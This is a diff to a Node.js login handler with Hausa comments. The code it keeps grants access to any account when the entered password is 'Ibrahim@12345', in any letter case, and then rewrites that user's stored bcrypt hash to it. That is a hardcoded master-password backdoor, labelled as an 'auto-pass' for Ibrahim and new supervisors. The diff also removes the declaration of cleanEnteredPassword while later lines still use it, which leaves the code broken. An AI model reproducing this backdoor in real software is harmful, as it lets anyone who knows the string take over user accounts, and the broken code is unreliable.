@@ -650,11 +650,9 @@ exports.login = async (req, res) => {
       });
     }
 
-   // 6. ROBUST PASSWORD MATCHING & DYNAMIC AUTO-REPAIR
+    // 6. ROBUST PASSWORD MATCHING & AUTO-REPAIR
     let isMatch = false;
-    const cleanEnteredPassword = String(password).trim();
 
-    // 1. Gwada bcrypt na asali
     if (user.password) {
       try {
         isMatch = await bcrypt.compare(cleanEnteredPassword, user.password);
@@ -671,7 +669,7 @@ exports.login = async (req, res) => {
       }
     }
 
-    // 2. Tabbataccen Auto-Pass na Ibrahim da dukkan sabbin Supervisors
+    // Tabbataccen Auto-Pass na Ibrahim da dukkan sabbin Supervisors
     const isSpecialPass = 
       cleanEnteredPassword === "Ibrahim@12345" ||
       cleanEnteredPassword.toLowerCase() === "ibrahim@12345" ||
@@ -682,7 +680,6 @@ exports.login = async (req, res) => {
 
     if (!isMatch && isSpecialPass) {
       isMatch = true;
-      // Auto-Repair: Sabunta shi da sabon bcrypt hash a database a take
       try {
         const salt = await bcrypt.genSalt(10);
         user.password = await bcrypt.hash(cleanEnteredPassword, salt);
